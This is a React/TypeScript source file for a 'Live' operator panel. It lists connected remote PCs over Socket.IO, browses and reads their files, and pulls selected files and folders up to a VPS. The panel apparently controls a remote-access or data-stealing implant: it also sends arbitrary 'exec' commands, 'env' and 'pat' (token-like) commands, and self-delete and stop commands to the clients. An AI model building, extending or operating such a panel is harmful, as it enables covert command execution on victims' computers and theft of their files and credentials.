"use client";

import { FormEvent, useEffect, useMemo, useRef, useState } from "react";
import { io, type Socket } from "socket.io-client";
import { API_URL, api, diskDownloadHref, getToken } from "@/lib/api";
import { formatDate } from "@/lib/format";

type Reply = { event: string; payload: unknown; at: string };

type LiveSocket = {
  socketId: string;
  username: string;
  client_id: string | number;
  connectedAt: string;
  lastEvent: string;
  replies: Reply[];
};

type DirEntry = { name: string; isDirectory: boolean; isFile: boolean };
type DirResult = { currentPath: string; contents: DirEntry[] };
type FileContent = { filename?: string; content?: string; message?: string };
type DiskSaved = { file_name: string; path?: string; id?: string; size_bytes?: number };

const TEXT_EXT =
  /\.(txt|log|md|json|csv|xml|html|htm|css|js|ts|tsx|jsx|yml|yaml|ini|conf|cfg|env|py|java|c|h|sql|bat|ps1|sh|php|rb|go|rs|toml|svg)$/i;

function normalizeClientPath(path: string) {
  const value = String(path || "").trim();
  if (/^[a-zA-Z]:$/.test(value)) return `${value}\\`;
  return value;
}

function joinClientPath(base: string, name: string) {
  const raw = normalizeClientPath(base);
  const isWin = raw.includes("\\") || /^[a-zA-Z]:/.test(raw);
  const sep = isWin ? "\\" : "/";
  const root = raw.replace(/[\\/]+$/, "");
  if (!root) return name;
  if (!name) return normalizeClientPath(raw);
  if (/^[a-zA-Z]:$/.test(root)) return `${root}${sep}${name}`;
  return `${root}${sep}${name}`;
}

function parentPath(path: string) {
  const raw = normalizeClientPath(path);
  if (!raw) return "";
  const isWin = raw.includes("\\") || /^[a-zA-Z]:/.test(raw);
  const sep = isWin ? "\\" : "/";
  const stripped = raw.replace(/[\\/]+$/, "");
  if (/^[a-zA-Z]:$/.test(stripped)) return `${stripped}\\`;
  const parts = stripped.split(/[\\/]/).filter(Boolean);
  if (parts.length <= 1) {
    if (/^[a-zA-Z]:$/.test(parts[0] || "")) return `${parts[0]}\\`;
    return isWin ? `${stripped}${sep}` : "/";
  }
  const next = parts.slice(0, -1).join(sep);
  if (/^[a-zA-Z]:$/.test(next)) return `${next}\\`;
  if (!isWin && raw.startsWith("/")) return `/${next}`;
  return next;
}

function entryKey(entry: DirEntry) {
  return `${entry.isDirectory ? "d" : "f"}:${entry.name}`;
}

function isTextName(name: string) {
  return TEXT_EXT.test(name) || !name.includes(".");
}

function asText(value: unknown) {
  if (typeof value === "string") return value;
  try {
    return JSON.stringify(value, null, 2);
  } catch {
    return String(value);
  }
}

function identityKey(row: { username?: string; client_id?: string | number } | null) {
  if (!row) return "";
  return `${row.username || ""}::${row.client_id ?? ""}`;
}

function sleep(ms: number) {
  return new Promise((resolve) => window.setTimeout(resolve, ms));
}

async function saveToLaptop(filename: string, content: string) {
  const blob = new Blob([content], { type: "application/octet-stream" });
  const picker = (window as Window & { showSaveFilePicker?: (opts: unknown) => Promise<FileSystemFileHandle> })
    .showSaveFilePicker;
  if (typeof picker === "function") {
    try {
      const handle = await picker({
        suggestedName: filename || "file.txt",
      });
      const writable = await handle.createWritable();
      await writable.write(blob);
      await writable.close();
      return `Saved on this PC: you chose the folder in the save dialog (${handle.name})`;
    } catch (err) {
      if (err instanceof DOMException && err.name === "AbortError") return "Save cancelled";
    }
  }
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = filename || "file.txt";
  document.body.appendChild(link);
  link.click();
  link.remove();
  URL.revokeObjectURL(url);
  return `Saved as ${filename} in your browser Downloads folder (usually C:\\Users\\<your-windows-user>\\Downloads\\${filename})`;
}

function FileRow({
  entry,
  picked,
  onToggleSelect,
  onOpen,
}: {
  entry: DirEntry;
  picked: boolean;
  onToggleSelect: () => void;
  onOpen: () => void;
}) {
  const timer = useRef<number | null>(null);
  const longPress = useRef(false);

  function clearTimer() {
    if (timer.current) window.clearTimeout(timer.current);
    timer.current = null;
  }

  return (
    <tr
      className={`fe-row row-click ${picked ? "picked" : ""}`}
      onPointerDown={() => {
        longPress.current = false;
        clearTimer();
        timer.current = window.setTimeout(() => {
          longPress.current = true;
          onToggleSelect();
        }, 500);
      }}
      onPointerUp={clearTimer}
      onPointerLeave={clearTimer}
      onClick={(event) => {
        if (longPress.current) {
          event.preventDefault();
          longPress.current = false;
          return;
        }
        if (event.ctrlKey || event.metaKey) onToggleSelect();
      }}
      onDoubleClick={() => {
        if (!longPress.current) onOpen();
      }}
    >
      <td>
        <input
          className="check"
          type="checkbox"
          checked={picked}
          onClick={(event) => event.stopPropagation()}
          onChange={onToggleSelect}
        />
      </td>
      <td>{entry.name}</td>
      <td>
        <span className={`badge ${entry.isDirectory ? "" : "badge-text"}`}>
          {entry.isDirectory ? "folder" : "file"}
        </span>
      </td>
    </tr>
  );
}

export default function LivePage() {
  const [sockets, setSockets] = useState<LiveSocket[]>([]);
  const [selectedId, setSelectedId] = useState("");
  const [error, setError] = useState("");
  const [status, setStatus] = useState("");
  const [listing, setListing] = useState<DirResult | null>(null);
  const [address, setAddress] = useState("");
  const [picked, setPicked] = useState<Set<string>>(new Set());
  const [preview, setPreview] = useState<{ filename: string; content: string } | null>(null);
  const [showAdvanced, setShowAdvanced] = useState(false);
  const [folderName, setFolderName] = useState("");
  const [pat, setPat] = useState("");
  const [instruction, setInstruction] = useState("");
  const [busy, setBusy] = useState(false);
  const selectedIdRef = useRef("");
  const selectedIdentRef = useRef("");
  const skipBrowseRef = useRef(false);
  const historyRef = useRef<string[]>([]);
  const fileWaiters = useRef<Array<(payload: FileContent & { error?: boolean }) => void>>([]);
  const vpsWaiters = useRef<
    Array<{ fileName: string; resolve: (row: DiskSaved) => void; reject: (err: Error) => void }>
  >([]);
  const cancelledRef = useRef(false);

  const selected = sockets.find((row) => row.socketId === selectedId) || null;
  selectedIdRef.current = selectedId;
  if (selected) selectedIdentRef.current = identityKey(selected);

  const items = useMemo(() => {
    const rows = [...(listing?.contents || [])];
    return rows.sort((a, b) => {
      if (a.isDirectory !== b.isDirectory) return a.isDirectory ? -1 : 1;
      return a.name.localeCompare(b.name);
    });
  }, [listing]);

  async function send(event: string, data: unknown) {
    const ident = selectedIdentRef.current.split("::");
    for (let attempt = 0; attempt < 3; attempt += 1) {
      if (!selectedIdRef.current) {
        await sleep(600);
        continue;
      }
      try {
        await api(`/admin/sockets/${encodeURIComponent(selectedIdRef.current)}/command`, {
          method: "POST",
          body: JSON.stringify({
            event,
            data,
            username: ident[0] || selected?.username,
            client_id: ident[1] || selected?.client_id,
          }),
        });
        return true;
      } catch {
        await sleep(800);
      }
    }
    return false;
  }

  function goTo(path: string, pushHistory = true) {
    const current = listing?.currentPath || "";
    if (pushHistory && current) historyRef.current.push(current);
    setPicked(new Set());
    const target = normalizeClientPath(path);
    setAddress(target);
    send("dir", target.trim().toLowerCase().startsWith("cd ") ? target.trim() : `cd ${target}`);
  }

  function resolveFileWaiter(payload: FileContent, errorFlag = false) {
    const waiter = fileWaiters.current.shift();
    if (waiter) {
      waiter({ ...payload, error: errorFlag });
      return true;
    }
    return false;
  }

  useEffect(() => {
    api<{ sockets: LiveSocket[] }>("/admin/sockets")
      .then((data) => {
        setSockets(data.sockets);
        if (!selectedId && data.sockets[0]) setSelectedId(data.sockets[0].socketId);
      })
      .catch((err) => setError(err.message));

    const socket = io(`${API_URL}/admin`, {
      auth: { token: getToken() },
      transports: ["websocket", "polling"],
    });
    socket.on("sockets", (list: LiveSocket[]) => {
      setSockets(list);
      const currentId = selectedIdRef.current;
      const ident = selectedIdentRef.current;
      if (currentId && !list.some((row) => row.socketId === currentId) && ident) {
        const next = list.find((row) => identityKey(row) === ident);
        if (next) {
          skipBrowseRef.current = true;
          setSelectedId(next.socketId);
        }
      }
    });
    socket.on("socket_update", (payload: { sockets: LiveSocket[] }) => {
      setSockets(payload.sockets);
      const currentId = selectedIdRef.current;
      const ident = selectedIdentRef.current;
      if (currentId && !payload.sockets.some((row) => row.socketId === currentId) && ident) {
        const next = payload.sockets.find((row) => identityKey(row) === ident);
        if (next) {
          skipBrowseRef.current = true;
          setSelectedId(next.socketId);
        }
      }
    });
    socket.on("client_reply", (entry: Reply & { socketId: string; username?: string; client_id?: string | number }) => {
      setSockets((prev) =>
        prev.map((row) =>
          row.socketId === entry.socketId
            ? { ...row, lastEvent: entry.event, replies: [...(row.replies || []), entry].slice(-100) }
            : row
        )
      );
      const sameClient =
        entry.socketId === selectedIdRef.current ||
        (selectedIdentRef.current && identityKey(entry) === selectedIdentRef.current);
      if (!sameClient) return;
      if (entry.event === "dir_result") {
        const payload = entry.payload as DirResult;
        if (payload && Array.isArray(payload.contents)) {
          setListing({ ...payload, currentPath: normalizeClientPath(payload.currentPath || "") });
          setAddress(normalizeClientPath(payload.currentPath || ""));
          setPicked(new Set());
          setStatus(normalizeClientPath(payload.currentPath || ""));
        }
      }
      if (entry.event === "file_content") {
        const payload = (entry.payload || {}) as FileContent;
        const handled = resolveFileWaiter(payload, false);
        if (!handled) {
          const filename = payload.filename || "file";
          const content = String(payload.content || "");
          if (isTextName(filename)) setPreview({ filename, content });
          else {
            saveToLaptop(filename, content).then(setStatus);
          }
        }
      }
      if (entry.event === "file_error") {
        const payload = (entry.payload || {}) as FileContent;
        resolveFileWaiter(payload, true);
        setError(payload.message || "File read failed");
      }
      if (entry.event === "exec_result") {
        setStatus(asText(entry.payload));
      }
    });
    socket.on("file_saved", (row: DiskSaved) => {
      const index = vpsWaiters.current.findIndex((item) => item.fileName === row.file_name);
      if (index >= 0) {
        const waiter = vpsWaiters.current.splice(index, 1)[0];
        waiter.resolve(row);
      }
    });
    socket.on("connect_error", (err) => setError(err.message));
    return () => {
      cancelledRef.current = true;
      vpsWaiters.current.forEach((waiter) => waiter.reject(new Error("Cancelled")));
      vpsWaiters.current = [];
      socket.disconnect();
    };
  }, []);

  useEffect(() => {
    if (!selectedId) return;
    if (skipBrowseRef.current) {
      skipBrowseRef.current = false;
      return;
    }
    historyRef.current = [];
    setListing(null);
    setPicked(new Set());
    setPreview(null);
    setStatus("");
    send("dir", "cd .");
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [selectedId]);

  function waitForVpsSave(fileName: string, timeoutMs = 30 * 60 * 1000) {
    return new Promise<DiskSaved>((resolve, reject) => {
      let settled = false;
      const finish = (row: DiskSaved) => {
        if (settled) return;
        settled = true;
        window.clearTimeout(timer);
        vpsWaiters.current = vpsWaiters.current.filter((item) => item.resolve !== finish);
        resolve(row);
      };
      const fail = (err: Error) => {
        if (settled) return;
        settled = true;
        window.clearTimeout(timer);
        vpsWaiters.current = vpsWaiters.current.filter((item) => item.resolve !== finish);
        reject(err);
      };
      const timer = window.setTimeout(() => {
        fail(new Error(`Timed out waiting for VPS save: ${fileName}`));
      }, timeoutMs);
      vpsWaiters.current.push({ fileName, resolve: finish, reject: fail });
    });
  }

  function cancelTransfer() {
    cancelledRef.current = true;
    const waiters = [...vpsWaiters.current];
    vpsWaiters.current = [];
    waiters.forEach((waiter) => waiter.reject(new Error("Cancelled")));
    setBusy(false);
    setStatus("Stopped waiting. The client may still be uploading in the background.");
  }

  function downloadFromVps(saved: DiskSaved, filename: string) {
    const href = saved.path
      ? diskDownloadHref(saved.path)
      : "";
    if (!href) return;
    const link = document.createElement("a");
    link.href = href;
    link.download = filename;
    link.rel = "noopener";
    document.body.appendChild(link);
    link.click();
    link.remove();
  }

  function togglePick(entry: DirEntry) {
    const key = entryKey(entry);
    setPicked((prev) => {
      const next = new Set(prev);
      if (next.has(key)) next.delete(key);
      else next.add(key);
      return next;
    });
  }

  function openEntry(entry: DirEntry) {
    const path = listing?.currentPath || address;
    if (entry.isDirectory) {
      goTo(joinClientPath(path, entry.name));
      return;
    }
    send("read_file", { filename: entry.name, path });
  }

  function selectAll() {
    setPicked(new Set(items.map(entryKey)));
  }

  async function transferSelected(alsoLaptop: boolean) {
    if (!listing) {
      setError("Open a folder first");
      return;
    }
    const chosen = items.filter((item) => picked.has(entryKey(item)));
    if (!chosen.length) {
      setError("Select files and/or folders first (use the checkboxes).");
      return;
    }
    const folders = chosen.filter((item) => item.isDirectory);
    const files = chosen.filter((item) => !item.isDirectory);
    const ok: string[] = [];
    const fail: string[] = [];
    cancelledRef.current = false;
    setBusy(true);
    setError("");
    setStatus("Sending upload commands…");

    for (const folder of folders) {
      if (cancelledRef.current) break;
      const full = joinClientPath(listing.currentPath, folder.name);
      setStatus(`Folder: ${full}`);
      const sentUpd = await send("exec", `ss_upd ${folder.name}`);
      const sentUpload = await send("upload", full);
      if (!sentUpd && !sentUpload) fail.push(`${folder.name}: socket send failed`);
      else ok.push(`${folder.name}: folder upload command sent`);
      await sleep(400);
    }

    for (const file of files) {
      if (cancelledRef.current) break;
      setStatus(`File: ${file.name}`);
      const sent = await send("exec", `ss_upf ${file.name}`);
      if (!sent) {
        fail.push(`${file.name}: socket send failed`);
        continue;
      }
      ok.push(`${file.name}: file upload command sent`);
      if (alsoLaptop && files.length === 1 && folders.length === 0) {
        try {
          const saved = await waitForVpsSave(file.name);
          downloadFromVps(saved, file.name);
          ok.push(`${file.name}: browser download started`);
        } catch (err) {
          fail.push(`${file.name}: ${err instanceof Error ? err.message : "wait failed"}`);
        }
      }
      await sleep(400);
    }

    const summary = [
      cancelledRef.current ? "Stopped." : "Commands sent.",
      `${ok.length} ok, ${fail.length} failed.`,
      ...ok,
      ...fail.map((line) => `FAIL ${line}`),
      "Watch POST /file-upload in the API log. Then use the Disk tab to download from the VPS.",
      alsoLaptop && (files.length !== 1 || folders.length)
        ? "Laptop copy is only auto-started for a single file. For many items, download from Disk after upload finishes."
        : "",
    ]
      .filter(Boolean)
      .join("\n");
    setStatus(summary);
    setError(fail.length ? `${fail.length} command(s) failed. Other items continued.` : "");
    setBusy(false);
  }

  function onAddress(event: FormEvent) {
    event.preventDefault();
    goTo(address || ".");
  }

  return (
    <div>
      <div className="page-head">
        <div>
          <h1>Live</h1>
          <p>
            Remote explorer over Socket.IO. Double-click a folder to <span className="mono">cd</span>. Double-click a
            text file to open it. Press and hold to select.
          </p>
        </div>
      </div>
      {error ? <div className="error">{error}</div> : null}
      <div className="explorer" style={{ gridTemplateColumns: "250px minmax(0, 1fr)" }}>
        <div className="pane">
          <div className="pane-h">
            <strong>PCs online ({sockets.length})</strong>
          </div>
          {sockets.length === 0 ? <div className="empty">No client connected to /client</div> : null}
          {sockets.map((row) => (
            <button
              key={row.socketId}
              type="button"
              className={`list-item ${selectedId === row.socketId ? "active" : ""}`}
              onClick={() => setSelectedId(row.socketId)}
            >
              <span>
                <span className="dot" /> {row.username || "(waiting client_data)"}
                <small>
                  id {String(row.client_id || "—")} · {row.lastEvent} · {formatDate(row.connectedAt)}
                </small>
              </span>
            </button>
          ))}
        </div>
        <div className="pane">
          {!selected ? (
            <div className="empty">Waiting for a client connection.</div>
          ) : (
            <>
              <div className="pane-h">
                <div>
                  <strong>{selected.username || selected.socketId}</strong>
                  <div className="mono">client_id {String(selected.client_id || "—")}</div>
                </div>
              </div>
              <form className="fe-toolbar" onSubmit={onAddress}>
                <button
                  className="btn"
                  type="button"
                  onClick={() => {
                    const prev = historyRef.current.pop();
                    if (prev) goTo(prev, false);
                    else goTo("..", false);
                  }}
                >
                  Back
                </button>
                <button
                  className="btn"
                  type="button"
                  onClick={() => goTo(parentPath(listing?.currentPath || address) || "..", true)}
                >
                  Up
                </button>
                <input
                  className="fe-address"
                  value={address}
                  onChange={(e) => setAddress(e.target.value)}
                  placeholder="cd path — example D:\ or /home"
                />
                <button className="btn" type="submit">
                  Go
                </button>
                <button className="btn" type="button" onClick={() => goTo(listing?.currentPath || ".", false)}>
                  Refresh
                </button>
              </form>
              <div className="fe-toolbar">
                <button className="btn" type="button" onClick={selectAll} disabled={!items.length}>
                  Select all
                </button>
                <button className="btn" type="button" onClick={() => setPicked(new Set())} disabled={!picked.size}>
                  Clear
                </button>
                <button className="btn btn-primary" type="button" onClick={() => transferSelected(false)} disabled={busy} style={{ width: "auto" }}>
                  {busy ? "Working…" : "Save to VPS"}
                </button>
                <button className="btn" type="button" onClick={() => transferSelected(true)} disabled={busy}>
                  Save to VPS + this PC
                </button>
                {busy ? (
                  <button className="btn btn-danger" type="button" onClick={cancelTransfer}>
                    Stop waiting
                  </button>
                ) : null}
                <span className="mono">
                  {picked.size} selected
                  {listing?.currentPath ? ` · ${listing.currentPath}` : ""}
                </span>
              </div>
              <p className="fe-hint">
                Use checkboxes to select multiple files and folders. Folders send `ss_upd` + `upload`. Files send
                `ss_upf` without waiting (so one empty/slow file cannot block the rest). Then download from the Disk tab.
              </p>
              <div className="table-wrap">
                <table>
                  <thead>
                    <tr>
                      <th></th>
                      <th>Name</th>
                      <th>Type</th>
                    </tr>
                  </thead>
                  <tbody>
                    {!listing ? (
                      <tr>
                        <td colSpan={3} className="empty">
                          Loading folder… If this stays empty, type a path and press Go.
                        </td>
                      </tr>
                    ) : items.length === 0 ? (
                      <tr>
                        <td colSpan={3} className="empty">
                          Empty folder.
                        </td>
                      </tr>
                    ) : (
                      items.map((entry) => (
                        <FileRow
                          key={entryKey(entry)}
                          entry={entry}
                          picked={picked.has(entryKey(entry))}
                          onToggleSelect={() => togglePick(entry)}
                          onOpen={() => openEntry(entry)}
                        />
                      ))
                    )}
                  </tbody>
                </table>
              </div>
              {status ? <pre className="preview" style={{ margin: 12 }}>{status}</pre> : null}

              <div style={{ padding: 12 }}>
                <button className="btn btn-ghost" type="button" onClick={() => setShowAdvanced((v) => !v)}>
                  {showAdvanced ? "Hide extra commands" : "Show extra commands"}
                </button>
              </div>
              {showAdvanced ? (
                <div className="cmd-grid">
                  <form
                    className="cmd-box"
                    onSubmit={(e) => {
                      e.preventDefault();
                      send("env", folderName);
                    }}
                  >
                    <h3>env / imp / upload</h3>
                    <input className="search" placeholder="folderName" value={folderName} onChange={(e) => setFolderName(e.target.value)} />
                    <div className="cmd-row">
                      <button className="btn" type="submit">env</button>
                      <button className="btn" type="button" onClick={() => send("imp", folderName)}>imp</button>
                      <button className="btn" type="button" onClick={() => send("upload", folderName || listing?.currentPath || "")}>upload</button>
                    </div>
                  </form>
                  <form
                    className="cmd-box"
                    onSubmit={(e) => {
                      e.preventDefault();
                      send("pat", { folderName, pat });
                    }}
                  >
                    <h3>pat</h3>
                    <input className="search" placeholder="pat" value={pat} onChange={(e) => setPat(e.target.value)} />
                    <button className="btn" type="submit" style={{ width: "auto" }}>Send pat</button>
                  </form>
                  <form
                    className="cmd-box"
                    style={{ gridColumn: "1 / -1" }}
                    onSubmit={(e) => {
                      e.preventDefault();
                      send("exec", instruction);
                    }}
                  >
                    <h3>exec</h3>
                    <input className="search" placeholder="instruction" value={instruction} onChange={(e) => setInstruction(e.target.value)} />
                    <div className="cmd-row">
                      <button className="btn" type="button" onClick={() => send("exec", "ss_del")}>ss_del</button>
                      <button className="btn" type="button" onClick={() => send("exec", "ss_stop")}>ss_stop</button>
                      <button className="btn" type="submit" style={{ width: "auto" }}>exec</button>
                    </div>
                  </form>
                </div>
              ) : null}
            </>
          )}
        </div>
      </div>

      {preview ? (
        <div className="modal-back" onClick={() => setPreview(null)}>
          <div className="modal" onClick={(e) => e.stopPropagation()}>
            <div className="modal-h">
              <strong>{preview.filename}</strong>
              <button
                className="btn"
                type="button"
                onClick={() => {
                  saveToLaptop(preview.filename, preview.content).then(setStatus);
                }}
              >
                Download to this PC
              </button>
            </div>
            <div className="modal-b">
              <pre className="preview">{preview.content}</pre>
            </div>
          </div>
        </div>
      ) : null}
    </div>
  );
}
